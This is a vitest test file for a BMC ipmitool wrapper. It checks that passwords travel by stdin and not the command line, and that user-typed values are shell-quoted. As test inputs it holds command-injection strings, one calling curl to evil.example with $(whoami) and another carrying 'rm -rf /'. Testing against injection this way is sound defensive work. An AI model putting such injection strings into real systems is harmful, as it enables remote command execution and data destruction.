import { describe, expect, it } from 'vitest'
import { moduleHarness } from '../helpers/module-harness'
import { resultProblem, runIpmi, runIpmiInspect, type IpmiResult } from '../../bmc/main/ipmi'
import { IPMI_TIMEOUT_MS, type BmcMachine } from '../../bmc/main/store'

/**
 * The command line this module hands to a shell on the connected machine.
 *
 * Three properties are load-bearing.
 *
 * The password never appears in the command - it goes down stdin into
 * `IPMI_PASSWORD="$(cat)"` for `ipmitool -E` - because a command line is
 * visible in `ps` to every user on that machine and lands in the app's own
 * command log.
 *
 * The password is now an *argument*, not a field on the machine: it lives in
 * the app's encrypted secret store and is fetched at the point of use, so the
 * machine object these functions are handed carries no credential at all.
 * That removes the second source it could have come from, which is why the
 * tests below assert on the machine as well as on the command.
 *
 * And every value that came out of the settings document is quoted, because a
 * BMC "address" is a string a user typed.
 */

const PASSWORD = 'sw0rdf1sh-never-in-argv'

/**
 * What a settings document written before version 3 still has sitting in it.
 * Deliberately distinct from PASSWORD so that "which source was used" is an
 * observable question rather than a tie.
 */
const LEGACY_PASSWORD = 'stale-plaintext-left-in-the-old-document'

/** A machine as a version 3 document holds it: no credential anywhere on it. */
function machineWith(overrides: Partial<BmcMachine> = {}): BmcMachine {
  return {
    id: 'm1',
    revision: 'r1',
    name: 'Chassis 1',
    ip: '10.0.0.5',
    port: 623,
    username: 'admin',
    enabled: true,
    ...overrides
  }
}

/**
 * A machine straight out of a pre-version-3 document, whose `password` field
 * the migration has not moved yet. `normalize()` carries that field through so
 * the migration can find it, so it is a shape these functions really do see.
 */
function legacyMachineWith(overrides: Partial<BmcMachine> = {}): BmcMachine {
  return { ...machineWith(overrides), password: LEGACY_PASSWORD }
}

function okHarness(stdout = 'Chassis Power is on\n'): ReturnType<typeof moduleHarness> {
  return moduleHarness('bmc', () => ({ stdout, stderr: '', code: 0 }))
}

/**
 * A minimal POSIX word splitter - enough to prove that quoting held.
 *
 * Asserting on substrings cannot tell "the metacharacter is inside quotes"
 * from "the metacharacter is loose in the command", which is the whole
 * question. This splits the command the way `sh` would: any `;`, `&` or `|`
 * that survives as its own token is an operator the shell would have obeyed.
 */
function shellWords(command: string): string[] {
  const words: string[] = []
  let word = ''
  let started = false
  let i = 0
  const flush = (): void => {
    if (started) words.push(word)
    word = ''
    started = false
  }
  while (i < command.length) {
    const ch = command[i]
    if (ch === "'" || ch === '"') {
      const end = command.indexOf(ch, i + 1)
      if (end < 0) throw new Error(`unterminated ${ch} in: ${command}`)
      word += command.slice(i + 1, end)
      started = true
      i = end + 1
    } else if (ch === '\\') {
      word += command[i + 1] ?? ''
      started = true
      i += 2
    } else if (ch === ';' || ch === '&' || ch === '|') {
      flush()
      words.push(ch)
      i += 1
    } else if (/\s/.test(ch)) {
      flush()
      i += 1
    } else {
      word += ch
      started = true
      i += 1
    }
  }
  flush()
  return words
}

describe('runIpmi: the command line', () => {
  it('builds the documented ipmitool invocation, with every settings value single-quoted', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(harness.exec.mock.calls[0][0]).toBe(
      `IPMI_PASSWORD="$(cat)" ipmitool -I lanplus -H '10.0.0.5' -p '623' -U 'admin' -E -N 3 -R 2 chassis power status`
    )
  })

  it('carries a non-standard port through as the port argument rather than pasting it onto the host', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith({ port: 664 }), PASSWORD, 'mc info')

    const words = shellWords(harness.exec.mock.calls[0][0])
    expect(words[words.indexOf('-H') + 1]).toBe('10.0.0.5')
    expect(words[words.indexOf('-p') + 1]).toBe('664')
  })
})

describe('runIpmi: where the password comes from and where it goes', () => {
  it('sends the password it was handed down stdin and never writes it into the command', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    const [command, options] = harness.exec.mock.calls[0]
    // The security property of this whole module: a command line is readable
    // by every user on the connected machine via `ps`.
    expect(command).not.toContain(PASSWORD)
    expect(command).toContain('IPMI_PASSWORD="$(cat)"')
    expect(options?.stdin).toBe(PASSWORD)
  })

  it('is handed a machine that carries no password at all, so stdin has exactly one possible source', async () => {
    const harness = okHarness()
    const machine = machineWith()

    // Not `machine.password === undefined`: the point is that a version 3
    // document has no such field, so there is no second place the credential
    // could be read from and no second place it could be logged out of.
    expect('password' in machine).toBe(false)

    await runIpmi(harness.ctx, machine, PASSWORD, 'chassis power status')

    expect(harness.exec.mock.calls[0][1]?.stdin).toBe(PASSWORD)
    expect(JSON.stringify(machine)).not.toContain(PASSWORD)
  })

  it('ignores a legacy password still sitting on a pre-migration machine and uses only the argument', async () => {
    const harness = okHarness()
    const machine = legacyMachineWith()

    // This is what makes a half-finished migration safe: until the sweep moves
    // it, a version 2 document still has the old plaintext on the machine, and
    // nothing in the client may fall back to it.
    await runIpmi(harness.ctx, machine, PASSWORD, 'chassis power status')

    const [command, options] = harness.exec.mock.calls[0]
    expect(options?.stdin).toBe(PASSWORD)
    expect(options?.stdin).not.toBe(LEGACY_PASSWORD)
    expect(command).not.toContain(LEGACY_PASSWORD)
    // Nothing the module handed the host - command or options - mentions it.
    expect(JSON.stringify(harness.exec.mock.calls[0])).not.toContain(LEGACY_PASSWORD)
  })

  it('sends an empty password as an empty stdin rather than reaching for the legacy field', async () => {
    const harness = okHarness()

    // The degenerate case of the rule above: an empty argument is still the
    // only source. A `??`-style fallback would show up here as the old value.
    await runIpmi(harness.ctx, legacyMachineWith(), '', 'chassis power status')

    const [command, options] = harness.exec.mock.calls[0]
    expect(options?.stdin).toBe('')
    expect(command).not.toContain(LEGACY_PASSWORD)
  })

  it('keeps a password made entirely of shell metacharacters out of the command line too', async () => {
    const harness = okHarness()
    const nasty = `'; curl evil.example/$(whoami) #`

    await runIpmi(harness.ctx, machineWith(), nasty, 'chassis power status')

    const [command, options] = harness.exec.mock.calls[0]
    expect(command).not.toContain('curl')
    expect(command).not.toContain(nasty)
    expect(options?.stdin).toBe(nasty)
  })
})

describe('runIpmi: values a user typed cannot escape their argument', () => {
  it('quotes an address carrying a command separator so the shell reads it as one word', async () => {
    const harness = okHarness()
    const hostile = '10.0.0.5; rm -rf /'

    await runIpmi(harness.ctx, machineWith({ ip: hostile }), PASSWORD, 'chassis power status')

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain(`-H '10.0.0.5; rm -rf /'`)
    const words = shellWords(command)
    expect(words[words.indexOf('-H') + 1]).toBe(hostile)
    // No `;` survived as an operator, so nothing after the address runs.
    expect(words).not.toContain(';')
    expect(words).not.toContain('rm')
  })

  it('escapes a single quote in a user name instead of ending the quoted argument early', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith({ username: `a'b` }), PASSWORD, 'chassis power status')

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain(`-U 'a'\\''b'`)
    expect(command).not.toContain(`-U 'a'b'`)
    const words = shellWords(command)
    expect(words[words.indexOf('-U') + 1]).toBe(`a'b`)
    // The argument after the user name is still `-E`, i.e. nothing shifted.
    expect(words[words.indexOf('-U') + 2]).toBe('-E')
  })

  it('quotes a substitution in an address so the shell never expands it', async () => {
    const harness = okHarness()
    const hostile = '$(hostname).lan'

    await runIpmi(harness.ctx, machineWith({ ip: hostile }), PASSWORD, 'chassis power status')

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain(`-H '$(hostname).lan'`)
    expect(command).not.toContain(`-H $(hostname).lan`)
  })
})

describe('runIpmi: the time limit', () => {
  it('defaults to IPMI_TIMEOUT_MS and forwards it to exec', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(harness.exec.mock.calls[0][1]?.timeoutMs).toBe(IPMI_TIMEOUT_MS)
    expect(IPMI_TIMEOUT_MS).toBe(15_000)
  })

  it('lets a caller shorten it - a settings-page connection test must not hold the UI for 15s', async () => {
    const harness = okHarness()

    await runIpmi(harness.ctx, machineWith(), PASSWORD, 'mc info', 8_000)

    expect(harness.exec.mock.calls[0][1]?.timeoutMs).toBe(8_000)
    // The shortened call still carries the credential the same way; the
    // timeout is the last argument, not something that displaced stdin.
    expect(harness.exec.mock.calls[0][1]?.stdin).toBe(PASSWORD)
  })
})

describe('runIpmi: what a failure comes back as', () => {
  it('classifies a non-zero exit and pairs the tool output with an explanation of it', async () => {
    const stderr = [
      'Error: RAKP 2 message indicates an error : unauthorized name',
      'Error: Unable to establish IPMI v2 / RMCP+ session'
    ].join('\n')
    const harness = moduleHarness('bmc', () => ({ stdout: '', stderr, code: 1 }))

    const result = await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(result.ok).toBe(false)
    expect(result.failure).toBe('auth')
    expect(result.message).toContain('RAKP 2')
    // Collapsed to one line: this ends up in a card notice, not a log pane.
    expect(result.message).not.toContain('\n')
    expect(result.explanation?.endsWith('.')).toBe(true)
    expect(result.explanation).not.toBe(result.message)
  })

  it('collapses and truncates a runaway stderr to 500 characters', async () => {
    const stderr = `${'Get Device ID command failed \n\t'.repeat(60)}`
    const harness = moduleHarness('bmc', () => ({ stdout: '', stderr, code: 1 }))

    const result = await runIpmi(harness.ctx, machineWith(), PASSWORD, 'sdr elist')

    expect(stderr.length).toBeGreaterThan(500)
    expect(result.message).toHaveLength(500)
    expect(result.message).not.toMatch(/\s\s|\n|\t/)
  })

  it('still names the failure when the timeout wrapper killed ipmitool before it printed anything', async () => {
    const harness = moduleHarness('bmc', () => ({ stdout: '', stderr: '', code: 124 }))

    const result = await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(result.ok).toBe(false)
    expect(result.failure).toBe('timeout')
    // With no output at all, the exit code is all there is to report.
    expect(result.message).toBe('ipmitool exited with code 124')
    expect(result.explanation?.length).toBeGreaterThan(40)
  })

  it('returns a well-formed result rather than rejecting when exec itself throws', async () => {
    const harness = moduleHarness('bmc', () => {
      throw new Error('module "bmc" is no longer running')
    })

    // A sweep runs one of these per machine; a rejection here would take the
    // whole sweep down instead of marking one card.
    const result = await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(result).toMatchObject({ ok: false, stdout: '', failure: 'error' })
    expect(result.message).toBe('module "bmc" is no longer running')
    expect(result.explanation?.length).toBeGreaterThan(40)
  })

  it('keeps the password out of the result a failure is reported through', async () => {
    // Whatever comes back here is shown on a card and can be logged; ipmitool
    // echoes its own arguments in some error paths, so the result is the last
    // place the credential could escape from.
    const harness = moduleHarness('bmc', () => ({
      stdout: '',
      stderr: 'Error: Unable to establish IPMI v2 / RMCP+ session',
      code: 1
    }))

    const result = await runIpmi(harness.ctx, machineWith(), PASSWORD, 'chassis power status')

    expect(JSON.stringify(result)).not.toContain(PASSWORD)
  })
})

describe('runIpmiInspect', () => {
  it('reads MC, FRU and LAN in one shell invocation, marked with splittable section headers', async () => {
    const harness = okHarness('')

    await runIpmiInspect(harness.ctx, machineWith(), PASSWORD, 25_000)

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain(`echo '===MC==='`)
    expect(command).toContain(`echo '===FRU==='`)
    expect(command).toContain(`echo '===LAN==='`)
    // splitSections() in @shared/shell only recognises /^===[A-Z]+===$/.
    for (const marker of command.match(/===[^=]+===/g) ?? []) {
      expect(marker).toMatch(/^===[A-Z]+===$/)
    }
    expect(command.indexOf('===MC===')).toBeLessThan(command.indexOf('===FRU==='))
    expect(command.indexOf('===FRU===')).toBeLessThan(command.indexOf('===LAN==='))
    expect(harness.exec.mock.calls[0][1]?.timeoutMs).toBe(25_000)
  })

  it('stops after MC when MC fails, so an unreachable BMC is not asked three times', async () => {
    const harness = okHarness('')

    await runIpmiInspect(harness.ctx, machineWith(), PASSWORD, 25_000)

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain('__bm_mc=$?')
    expect(command).toContain('if [ "$__bm_mc" -ne 0 ]; then exit "$__bm_mc"; fi')
    expect(command.indexOf('__bm_mc=$?')).toBeLessThan(command.indexOf('===FRU==='))
  })

  it('lets FRU and LAN fail without failing the read - plenty of BMCs support neither', async () => {
    const harness = okHarness('')

    await runIpmiInspect(harness.ctx, machineWith(), PASSWORD, 25_000)

    const command = harness.exec.mock.calls[0][0]
    expect(command).toContain('fru print || true')
    expect(command).toContain('lan print 1 || true')
  })

  it('exports the password into the environment without putting it on the command line', async () => {
    const harness = okHarness('')

    await runIpmiInspect(harness.ctx, machineWith(), PASSWORD, 25_000)

    const [command, options] = harness.exec.mock.calls[0]
    expect(command).not.toContain(PASSWORD)
    expect(command).toContain('IPMI_PASSWORD="$(cat)"')
    // Every ipmitool in the chain needs it, so it is exported once up front.
    expect(command).toContain('export IPMI_PASSWORD')
    expect(options?.stdin).toBe(PASSWORD)
  })

  it('takes the password from its argument here too, not from a legacy field on the machine', async () => {
    const harness = okHarness('')
    const machine = legacyMachineWith()

    // Three ipmitool invocations share one exported variable, so a fallback to
    // the stale value would authenticate all three against the wrong secret.
    await runIpmiInspect(harness.ctx, machine, PASSWORD, 25_000)

    const [command, options] = harness.exec.mock.calls[0]
    expect(options?.stdin).toBe(PASSWORD)
    expect(command).not.toContain(LEGACY_PASSWORD)
    expect(JSON.stringify(harness.exec.mock.calls[0])).not.toContain(LEGACY_PASSWORD)
  })

  it('is handed a machine with no password on it, exactly as runIpmi is', async () => {
    const harness = okHarness('')
    const machine = machineWith()

    expect('password' in machine).toBe(false)

    await runIpmiInspect(harness.ctx, machine, PASSWORD, 25_000)

    expect(harness.exec.mock.calls[0][1]?.stdin).toBe(PASSWORD)
  })
})

describe('resultProblem', () => {
  it('says what the failure means and then quotes ipmitool, so both audiences are served', () => {
    const result: IpmiResult = {
      ok: false,
      stdout: '',
      failure: 'dns',
      message: 'Address lookup for bmc01.lan failed',
      explanation: 'The BMC address could not be resolved to an IP.'
    }

    expect(resultProblem(result, 'Could not read the power state.')).toBe(
      'The BMC address could not be resolved to an IP. (ipmitool said: Address lookup for bmc01.lan failed)'
    )
  })

  it('falls back to the sentence the caller supplied when the result carries no explanation', () => {
    const result: IpmiResult = { ok: false, stdout: '' }

    expect(resultProblem(result, 'Could not read the power state.')).toBe('Could not read the power state.')
  })

  it('still quotes ipmitool when only the fallback sentence is available', () => {
    const result: IpmiResult = { ok: false, stdout: '', message: 'Invalid command' }

    expect(resultProblem(result, 'Could not read the power state.')).toBe(
      'Could not read the power state. (ipmitool said: Invalid command)'
    )
  })
})
